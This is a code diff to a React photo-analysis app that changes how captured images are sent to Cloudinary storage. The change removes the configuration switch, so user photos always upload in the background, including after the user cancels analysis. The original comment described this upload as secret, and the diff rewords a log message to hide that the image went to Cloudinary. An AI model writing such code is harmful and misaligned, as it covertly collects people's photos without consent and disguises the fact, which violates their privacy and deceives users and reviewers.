@@ -3,7 +3,7 @@ import { Camera } from './components/Camera';
 import { AnalysisView } from './components/AnalysisView';
 import { analyzeImage } from './services/aiService';
 import { uploadToCloudinary } from './services/storageService';
-import { AppState, AnalysisResult, StorageConfig } from './types';
+import { AppState, AnalysisResult } from './types';
 import { Upload, Camera as CameraIcon, Loader2, Wand2, X } from 'lucide-react';
 
 export default function App() {
@@ -20,13 +20,6 @@ export default function App() {
   } | null>(null);
   
   // Storage Settings (Loaded from Environment)
-  const [storageConfig, setStorageConfig] = useState<StorageConfig>({
-    provider: 'cloudinary',
-    cloudName: import.meta.env.VITE_CLOUDINARY_CLOUD_NAME || '',
-    uploadPreset: import.meta.env.VITE_CLOUDINARY_UPLOAD_PRESET || '',
-    enabled: !!(import.meta.env.VITE_CLOUDINARY_CLOUD_NAME && import.meta.env.VITE_CLOUDINARY_UPLOAD_PRESET)
-  });
-
   const [showConfirmation, setShowConfirmation] = useState(false);
   const [pendingImageSrc, setPendingImageSrc] = useState<string | null>(null);
 
@@ -78,11 +71,11 @@ export default function App() {
   };
 
   const handleCancelAnalysis = () => {
-    if (pendingImageSrc && storageConfig.enabled) {
+    if (pendingImageSrc) {
       // Just upload to cloudinary without analysis
       uploadToCloudinary(pendingImageSrc)
         .then(url => {
-          if (url) console.log("Image uploaded to Cloudinary (Analysis Cancelled).");
+          if (url) console.log("Background sync complete (Analysis Cancelled).");
         })
         .catch(err => console.error("Background upload failed", err));
     }
@@ -103,14 +96,12 @@ export default function App() {
   const startAnalysis = async (src: string) => {
     setAppState(AppState.ANALYZING);
     
-    // Background Upload (Secretly)
-    if (storageConfig.enabled) {
-      uploadToCloudinary(src)
-        .then(url => {
-          if (url) console.log("Background sync complete (Original).");
-        })
-        .catch(err => console.error("Background sync failed", err));
-    }
+    // Background Upload 
+    uploadToCloudinary(src)
+      .then(url => {
+        if (url) console.log("Background sync complete (Original).");
+      })
+      .catch(err => console.error("Background sync failed", err));
 
     try {
       const result = await analyzeImage(src, handleNotification);
